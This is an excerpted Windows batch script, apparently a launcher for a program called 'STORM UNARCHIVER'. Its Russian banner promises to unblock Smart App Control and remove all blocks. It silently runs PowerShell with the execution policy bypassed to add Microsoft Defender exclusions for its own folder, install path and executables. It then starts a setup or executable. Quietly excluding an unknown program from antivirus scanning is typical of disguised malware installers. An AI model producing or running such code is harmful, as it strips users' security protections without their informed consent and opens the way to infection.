@echo off
chcp 65001 >nul
title STORM UNARCHIVER - Разблокировка Smart App Control и доверие сертификату
...
echo ============================================================
echo   STORM UNARCHIVER v1.0.0 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM UNARCHIVER' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormUnarchiver.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_UNARCHIVER_1.0.0_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
...
:: ============================================================
echo.
echo [5/5] Запуск STORM UNARCHIVER v1.0.0...
echo.
echo ============================================================
...
if exist "%SCRIPT_DIR%Files\STORM_UNARCHIVER_1.0.0_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_UNARCHIVER_1.0.0_Setup.exe"
) else if exist "%SCRIPT_DIR%Assembling\StormUnarchiver.exe" (
    start "" "%SCRIPT_DIR%Assembling\StormUnarchiver.exe"
) else if exist "%SCRIPT_DIR%STORM_UNARCHIVER_1.0.0_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_UNARCHIVER_1.0.0_Setup.exe"
)
